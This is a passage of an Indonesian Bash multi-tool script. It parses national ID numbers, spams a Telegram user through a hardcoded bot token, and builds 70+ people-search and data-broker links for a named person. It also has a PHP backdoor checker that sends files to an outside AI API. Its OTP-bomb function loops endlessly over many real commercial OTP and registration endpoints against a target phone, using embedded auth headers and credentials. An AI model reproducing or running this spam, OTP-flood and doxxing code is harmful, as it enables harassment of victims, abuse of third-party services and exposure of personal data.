    # Jalankan loading pura-pura (misalnya 3 detik) di background
    (sleep 3) &
    pid=$!
    spin $pid
    wait $pid

    # Ekstrak data
    tanggal="${nik:6:2}"
    bulan="${nik:8:2}"
    tahun="${nik:10:2}"
    prov="${nik:0:2}"
    kabkot="${nik:0:4}"
    kecamatan="${nik:0:6}"
    uniqcode="${nik:12:4}"

    # Jenis kelamin
    if ((10#$tanggal > 40)); then
        tanggal=$((10#$tanggal - 40))
        jeniskelamin="PEREMPUAN"
    else
        jeniskelamin="LAKI-LAKI"
    fi

    # Cek data.json
    if [[ ! -f "data.json" ]]; then
        echo -e "${RED}! Data Tidak Valid !${NC}"
        exit 1
    fi

    # Ambil data dari JSON
    provinsi=$(jq -r --arg p "$prov" '.provinsi[$p] // $p' data.json)
    kabupaten=$(jq -r --arg k "$kabkot" '.kabkot[$k] // $k' data.json)
    kecamatan_data=$(jq -r --arg kc "$kecamatan" '.kecamatan[$kc] // $kc' data.json)

    # Pecah kecamatan & kode pos
    if [[ "$kecamatan_data" == *"--"* ]]; then
        kecamatan_name="${kecamatan_data%%--*}"
        kode_pos="${kecamatan_data##*--}"
    else
        kecamatan_name="$kecamatan_data"
        kode_pos="N/A"
    fi

    # Output
    loading
    echo -e "${GREEN}!Tanggal Lahir: $tanggal/$bulan/$tahun${NC}"
    echo -e "${GREEN}!Jenis Kelamin: $jeniskelamin${NC}"
    echo -e "${GREEN}!Provinsi: $provinsi${NC}"
    echo -e "${GREEN}!Kab/Kota: $kabupaten${NC}"
    echo -e "${GREEN}!Kecamatan: $kecamatan_name${NC}"
    echo -e "${GREEN}!Kode Pos: $kode_pos${NC}"
    echo -e "${GREEN}!Uniqcode: $uniqcode${NC}"
}

spam_tg() {
    # Warna
    YELLOW='\033[1;33m'
    GREEN='\033[1;32m'
    RED='\033[1;31m'
    NC='\033[0m' # No Color

    # Token bot
    BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"

    clear
    echo -e "${YELLOW}===== SPAM TEXT =====${NC}"

    read -p "Masukkan ID Telegram Target: " chat_id
    if [[ -z "$chat_id" ]]; then
        echo -e "${RED}ID tidak boleh kosong!${NC}"
        return
    fi

    read -p "Masukkan Pesan: " pesan
    if [[ -z "$pesan" ]]; then
        echo -e "${RED}Pesan tidak boleh kosong!${NC}"
        return
    fi

    read -p "Jumlah Spam: " jumlah
    if ! [[ "$jumlah" =~ ^[0-9]+$ ]] || [[ "$jumlah" -le 0 ]]; then
        echo -e "${RED}Jumlah harus angka positif!${NC}"
        return
    fi

    read -p "Pakai jeda? (y/n): " use_delay
    if [[ "$use_delay" == "y" || "$use_delay" == "Y" ]]; then
        read -p "Masukkan jeda antar pesan (detik): " delay
        if ! [[ "$delay" =~ ^[0-9]+$ ]]; then
            echo -e "${RED}Delay harus angka!${NC}"
            return
        fi
    else
        delay=0
    fi

    echo -e "\n${YELLOW}Mulai spam...${NC}"

    for ((i=1; i<=jumlah; i++))
    do
        curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${pesan}" > /dev/null

        echo -e "[${i}/${jumlah}] Pesan terkirim."

        if [[ $delay -gt 0 ]]; then
            sleep "$delay"
        fi
    done

    echo -e "\n${GREEN}Selesai!${NC}"
}


track_nama() {
# ===========================================================
#  LACAK NAMA – 70+ Search Points
#  Cari jejak publik seseorang di berbagai mesin & platform
# ===========================================================

set -euo pipefail

# ---------- WARNA ----------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;94m'
CYAN='\033[0;96m'
NC='\033[0m' # no color

# ---------- FUNGSI ----------
url_encode() {
    # shell-friendly url-encode
    printf '%s' "$1" | jq -sRr @uri
}

print_section() {
    echo -e "\n${YELLOW}[∆] $1${NC}"
}

print_link() {
    echo -e "${BLUE}  •${NC} $1"
}

# ---------- INPUT ----------
echo -e "\n${CYAN}╔══════════════════════════════════════╗"
echo -e "║           LACAK NAMA                 ║"
echo -e "╚══════════════════════════════════════╝${NC}"
read -rp "Masukkan nama lengkap: " NAMA_RAW
[[ -z "$NAMA_RAW" ]] && { echo "Nama tidak boleh kosong"; exit 1; }

NAMA=$(url_encode "$NAMA_RAW")
echo -e "\n${BLUE}[↓] Sedang mengumpulkan link pencarian untuk: ${YELLOW}$NAMA_RAW${NC} ..."
sleep 2

# ---------- BANK PENCARIAN ----------
# Gunakan array agar mudah ditambah/dikurangi
declare -a links

# 1. Google Dorks (10)

links+=(
"https://www.google.com/search?q=%22$NAMA%22"
"https://www.google.com/search?q=%22$NAMA%22+site:facebook.com"
"https://www.google.com/search?q=%22$NAMA%22+site:linkedin.com"
"https://www.google.com/search?q=%22$NAMA%22+site:twitter.com"
"https://www.google.com/search?q=%22$NAMA%22+site:instagram.com"
"https://www.google.com/search?q=%22$NAMA%22+site:github.com"
"https://www.google.com/search?q=%22$NAMA%22+site:tiktok.com"
"https://www.google.com/search?q=%22$NAMA%22+site:youtube.com"
"https://www.google.com/search?q=%22$NAMA%22+filetype:pdf"
"https://www.google.com/search?q=%22$NAMA%22+site:reddit.com"
)

# 2. Facebook (2)
links+=(
"https://www.facebook.com/public/$NAMA"
"https://www.facebook.com/search/people/?q=$NAMA"
)

# 3. LinkedIn (2)
links+=(
"https://www.linkedin.com/pub/dir/$NAMA"
"https://www.linkedin.com/search/results/people/?keywords=$NAMA"
)

# 4. Twitter (2)
links+=(
"https://twitter.com/search?q=%22$NAMA%22&src=typed_query"
"https://twitter.com/search-advanced?q=$NAMA"
)

# 5. Instagram (2)
links+=(
"https://www.instagram.com/$NAMA"
"https://www.picuki.com/search/$NAMA"
)

# 6. GitHub (4)
links+=(
"https://github.com/search?q=$NAMA&type=users"
"https://api.github.com/users/$NAMA"
"https://gist.github.com/search?q=$NAMA"
"https://commits.top/$NAMA.html"
)

# 7. TikTok (2)
links+=(
"https://www.tiktok.com/search?q=$NAMA"
"https://urlebird.com/search/$NAMA"
)

# 8. YouTube (2)
links+=(
"https://www.youtube.com/results?search_query=%22$NAMA%22"
"https://www.youtube.com/c/$NAMA"
)

# 9. Reddit (2)
links+=(
"https://www.reddit.com/search/?q=%22$NAMA%22"
"https://www.reddit.com/user/$NAMA"
)

# 10. Search-Engine Khusus Orang (15)
links+=(
"https://www.peekyou.com/$NAMA"
"https://pipl.com/search/?q=$NAMA"
"https://thatsthem.com/name/$NAMA"
"https://www.spokeo.com/$NAMA"
"https://www.whitepages.com/name/$NAMA"
"https://www.zabasearch.com/people/$NAMA"
"https://www.mylife.com/$NAMA"
"https://www.truthfinder.com/results/?name=$NAMA"
"https://www.beenverified.com/people/$NAMA"
"https://www.fastpeoplesearch.com/name/$NAMA"
"https://www.advancedbackgroundchecks.com/names/$NAMA"
"https://www.clustrmaps.com/person/$NAMA"
"https://www.searchpeoplefree.com/find/$NAMA"
"https://checkpeople.com/people/search/$NAMA"
"https://www.idcrawl.com/$NAMA"
)

# 11. Pencarian Gambar (4)
links+=(
"https://lens.google.com/uploadbyurl?url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
"https://yandex.com/images/search?rpt=imageview&url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
"https://tineye.com/search?url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
"https://images.bing.com/visualsearch"
)

# 12. Domain / Email / Username (6)
links+=(
"https://namechk.com/$NAMA"
"https://checkusernames.com/usercheck.php?target=$NAMA"
"https://whatsmyname.app"
"https://knowem.com/checkusernames.php?u=$NAMA"
"https://hunter.io/search/$NAMA"
"https://www.email-format.com/i/search/$NAMA"
)

# 13. Pencarian Nomor Telepon (3)
links+=(
"https://www.truecaller.com/search/$NAMA"
"https://sync.me/search/?q=$NAMA"
"https://www.numlookup.com/search/$NAMA"
)

# 14. Pencarian Alamat (3)
links+=(
"https://www.fastpeoplesearch.com/address/$NAMA"
"https://www.whitepages.com/address/$NAMA"
"https://www.addresssearch.com/result.php?name=$NAMA"
)

# 15. Pencarian Pekerjaan / Profesional (5)
links+=(
"https://angel.co/search?query=$NAMA"
"https://wellfound.com/u/$NAMA"
"https://stackoverflow.com/users/filter?search=$NAMA"
"https://dev.to/search?q=$NAMA"
"https://medium.com/search?q=$NAMA"
)

# 16. Pencarian Akademik (5)
links+=(
"https://scholar.google.com/scholar?q=%22$NAMA%22"
"https://www.researchgate.net/search.Search.html?query=$NAMA"
"https://academia.edu/search?utf8=✓&q=$NAMA"
"https://orcid.org/orcid-search/search?searchQuery=$NAMA"
"https://pubmed.ncbi.nlm.nih.gov/?term=%22$NAMA%22"
)

# 17. Pencarian Berita (3)
links+=(
"https://news.google.com/search?q=%22$NAMA%22"
"https://www.bing.com/news/search?q=%22$NAMA%22"
"https://duckduckgo.com/?q=%22$NAMA%22&iar=news"
)

# 18. Pencarian Karya Kreatif (3)
links+=(
"https://www.behance.net/search/projects/?search=$NAMA"
"https://dribbble.com/search/$NAMA"
"https://soundcloud.com/search?q=$NAMA"
)

# 19. Pencarian Blog / Situs Pribadi (3)
links+=(
"https://about.me/$NAMA"
"https://wordpress.com/search/$NAMA"
"https://wix.com/search/$NAMA"
)

# 20. Misc / Utility (3)
links+=(
"https://www.waybackmachine.org/*/https://*$NAMA*"
"https://publicwww.com/websites/%22$NAMA%22"
"https://boardreader.com/s/$NAMA.html"
)

# ---------- OUTPUT ----------
echo -e "\n${GREEN}[✓] 70+ link siap dibuka:${NC}"
idx=1
for l in "${links[@]}"; do
    echo -e "${GREEN}$idx.${NC} $l"
    ((idx++))
done

echo -e "\n${GREEN}[✓] Selesai. Salin / klik link di atas.${NC}"
}

checker_backdor_php() {
clear

# Tampilkan ASCII art
banner=$(cat << "EOF"
╔═══╦═══╦═╗─╔╦═╗╔═╦╗──╔╗
╚╗╔╗║╔═╗║║╚╗║╠╗╚╝╔╣╚╗╔╝║
─║║║║║─║║╔╗╚╝║╚╗╔╝╚╗╚╝╔╝
─║║║║╚═╝║║╚╗║║╔╝╚╗─╚╗╔╝
╔╝╚╝║╔═╗║║─║║╠╝╔╗╚╗─║║
╚═══╩╝─╚╩╝─╚═╩═╝╚═╝─╚╝
EOF
)
echo "$banner"
echo ""
echo "Selamat datang di AI Backdoor Scanner"
echo "---------------------------------------"
echo "Tool ini akan memeriksa file PHP apakah mengandung backdoor atau tidak."
echo "Silakan masukkan folder yang ingin diperiksa."
echo ""

# Minta input folder dari user
echo -e "${BG_RED}${YELLOW}CONTOH PATH: /storage/emulated/0/Folder1/Danxy"
read -rp "Masukkan path folder: " TARGET_DIR

# Cek apakah folder ada
if [[ ! -d "$TARGET_DIR" ]]; then
    echo "[!] Folder '$TARGET_DIR' tidak ditemukan!"
    exit 1
fi

# Variabel API
API_URL="https://xiex.my.id/api/ai/chat/completions"
API_KEY="ApiKey"
MODEL="brainxiex"
DEBUG_FILE="debug.txt"

FILES=($(find "$TARGET_DIR" -type f -name "*.php"))
TOTAL=${#FILES[@]}

echo "[*] Memulai analisis AI untuk file PHP..."
echo "=== DEBUG LOG ===" > "$DEBUG_FILE"

i=1
for FILE in "${FILES[@]}"; do
    echo ""
    echo "[#] ($i/$TOTAL) Memeriksa: $FILE"

    CONTENT=$(head -n 100 "$FILE")

    if [[ -z "$CONTENT" ]]; then
        echo "[?] $FILE -> kosong / tidak bisa dianalisis"
        echo -e "\n[$FILE] Kosong / tidak bisa dianalisis" >> "$DEBUG_FILE"
        ((i++))
        continue
    fi

    PROMPT=$(printf "Apakah kode PHP berikut berisi backdoor? Berikan jawaban singkat dan to the point:\n\n%s" "$CONTENT")

    JSON=$(jq -n \
        --arg model "$MODEL" \
        --arg apikey "$API_KEY" \
        --arg content "$PROMPT" \
        '{
            model: $model,
            apikey: $apikey,
            messages: [{role: "user", content: $content}]
        }') || {
        echo "[!] $FILE -> gagal membuat JSON (kemungkinan prompt terlalu panjang)"
        echo -e "\n[$FILE] ERROR saat membuat JSON" >> "$DEBUG_FILE"
        ((i++))
        continue
    }

    echo -e "\n=== [$FILE] ===" >> "$DEBUG_FILE"
    echo -e ">> JSON:\n$JSON" >> "$DEBUG_FILE"

    RESPONSE=$(curl -s -X POST "$API_URL" \
        -H "Content-Type: application/json" \
        -d "$JSON")

    echo -e ">> RESPONSE:\n$RESPONSE" >> "$DEBUG_FILE"

    RESULT=$(echo "$RESPONSE" | jq -r '.answer // .message.content // .choices[0].message.content // "Tidak ada respon dari AI"')

    if [[ "$RESULT" == *"apikey salah"* ]]; then
        echo "[+] $FILE -> hasil: apikey salah"
    elif [[ "$RESULT" == "null" || -z "$RESULT" ]]; then
        echo "[!] $FILE -> respons error dari server"
        echo "    ↳ Pesan server: $(echo "$RESPONSE" | jq -r '.message // .error // empty')"
    else
        echo "[+] $FILE -> hasil: $RESULT"
    fi

    sleep 5
    ((i++))
    done
echo -e "\n${GREEN}Selesai!${NC}"
}


send_otp() {
  clear -e "${WHITE}
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠭⣿⣿⣿⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡿⣿⡿⣿⣿⣿⣿⣿⣦⣴⣶⣶⣶⣶⣦⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣲⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡝⢿⣌⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣾⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠲⡝⡷⣮⣝⣻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣦⣝⠓⠭⣿⡿⢿⣿⣿⣛⠻⣿⠿⠿⣿⣿⣿⣿⣿⣿⡿⣇⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣤⡀⠈⠉⠚⠺⣿⠯⢽⣿⣷⣄⣶⣷⢾⣿⣯⣾⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀${RED}⡟${WHITE}⠀⠀⣴⣿⣿⣼⠈⠉⠃⠋⢹⠁⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣴⣿⣿⡿⣿⠀⠀⠀⠀⠇⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢿⢿⣾⣿⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠿⢿⡄⢦⣤⣤⣶⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠘⠛⠋⠁⠁⣀⢉⡉⢻⡻⣯⣻⣿⢻⣿⣀⠀⠀⠀⢠⣾⣿⣿⣿⣹⠉⣍⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠠⠔⠒⠋⠀⡈⠀⠠⠤⠀⠓⠯⣟⣻⣻⠿⠛⠁⠀⠀⠣⢽⣿⡻⠿⠋⠰⠤⣀⡈⠒⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠔⠊⠁⠀⣀⠔⠈⠁⠀⠀⠀⠀⠀⣶⠂⠀⠀⠀⢰⠆⠀⠀⠀⠈⠒⢦⡀⠉⠢⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⠎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠰⠃⠀⠀⠀⠀⠀⠀⠀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  read -p "Masukkan Nomor Telepon (08xxxxxxxxxx): " phone_number

  [[ "$phone_number" == "exit" ]] && return

  validate_phone_number "$phone_number" || {
    echo -e "${RED}Nomor telepon tidak valid.${NC}"
    return
  }

  send_otp_to_number() {
    local nomor="$1"
    local LOG_FILE="otp_errors.log"

    local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
    local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
    local headers=("Content-Type: application/json; charset=utf-8")

    (curl -s -X POST -d "$payload" -H "${headers[0]}" "$url" >/dev/null 2>>"$LOG_FILE") &
    echo -e "${YELLOW}Mengirim OTP ke $nomor melalui Singa...${NC}"

    echo -e "${YELLOW}Mencoba mengirim OTP melalui Titipku...${NC}"
    (
      curl -s -X POST "https://app.candireload.com/apps/v8/users/req_otp_register_wa" \
        -H "Content-Type: application/json" \
        -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
        -d "{\"uuid\": \"b787045b140c631f\", \"phone\": \"$nomor\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    speedcash_token=$(
      curl -s -X POST "https://sofia.bmsecure.id/central-api/oauth/token" \
        -H "Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials"
    )

    speedcash_token_value=$(echo "$speedcash_token" | grep -o '"access_token":"[^"]*"' | cut -d':' -f2 | tr -d '"')

    (
      curl -s -X POST "https://sofia.bmsecure.id/central-api/sc-api/otp/generate" \
        -H "Authorization: Bearer $speedcash_token_value" \
        -H "Content-Type: application/json" \
        -d "{\"version_name\": \"6.2.1 (428)\", \"phone\": \"$nomor\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    (
      curl -s -X POST "https://keranjangbelanja.co.id/api/v1/user/otp" \
        -H "content-type: multipart/form-data; boundary=--dio-boundary-0879576676" \
        --data-binary $'----dio-boundary-0879576676\r\ncontent-disposition: form-data; name="phone"\r\n\r\n'"$nomor"$'\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name="otp"\r\n\r\n118872\r\n----dio-boundary-0879576676--' >/dev/null 2>>"$LOG_FILE"
    ) &
    (curl -s "https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$nomor" >/dev/null 2>>"$LOG_FILE") &
    (
      curl -s -X POST "https://agenpayment-app.findig.id/api/v1/user/register" \
        -H "content-type: application/json; charset=utf-8" \
        -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
        -d "{\"name\": \"AAD\", \"phone\": \"$nomor\", \"pin\": \"1111\", \"referral_code\": \"\", \"password\": \"12345678\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    (
      curl -s -X POST "https://agenpayment-app.findig.id/api/v1/user/login" \
        -H "content-type: application/json; charset=utf-8" \
        -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
        -d "{\"phone\": \"$nomor\", \"pin\": \"1111\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    # ── NEW ENDPOINT ───────────────────────────────────────────
    (
  curl -s -G "https://rd-new-pair-web.vercel.app/api/x9r7a3h19" \
       --data-urlencode "number=$nomor" >/dev/null 2>>"$LOG_FILE"
    ) &
    echo -e "${CYAN}OTP telah dikirim ke berbagai API (secara paralel).${NC}"
  }
  send_otp_to_number "$phone_number"
  while true; do
    send_otp_to_number "$phone_number"
  done
}

ngl_spam() {
  clear
  echo -e "${RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
